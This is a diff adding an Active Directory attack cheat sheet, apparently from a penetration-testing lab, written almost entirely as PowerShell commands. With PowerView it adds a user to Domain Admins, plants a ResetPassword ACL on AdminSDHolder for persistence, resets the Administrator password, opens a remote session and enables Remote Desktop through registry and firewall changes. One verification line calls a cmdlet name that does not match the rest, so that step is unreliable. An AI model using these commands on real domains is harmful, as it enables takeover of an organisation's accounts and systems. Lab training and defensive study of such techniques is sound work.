@@ -1,0 +1,30 @@
+--------------Abusing if we were able to add ourself to Domain Admin ACL----------+
+#Check access before to see that you do not have access to DA
+Get-DomainGroupMember -SamAccountName "Domain Admins" -Recurse
+
+
+#Abusing FullControl using PowerView:
+import-module .\powerview.ps1
+Add-DomainGroupMember -Identity 'Domain Admins' -Members student5 -Verbose
+
+#Check access to see that now you do have access to DA
+Get-DomainGroups -SamAccountName "Domain Admins" -Recurse
+
+
+------------#Password Reset for any account----------
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=pentesting,DC=local' -PrincipalIdentity student529 -Rights ResetPassword -Verbose
+
+#Abusing ResetPassword using PowerView:
+Import-Module .\PowerView.ps1
+Set-DomainUserPassword -Identity Administrator -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
+#Enter Session with new password
+Enter-PSSession –Computername ad –credential pentesting\Administrator
+
+
+----------#Extra-------
+#Enable Remote Desktop
+Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
+#Activate the firewall rule
+Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+#Enable authentication via RDP
+Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
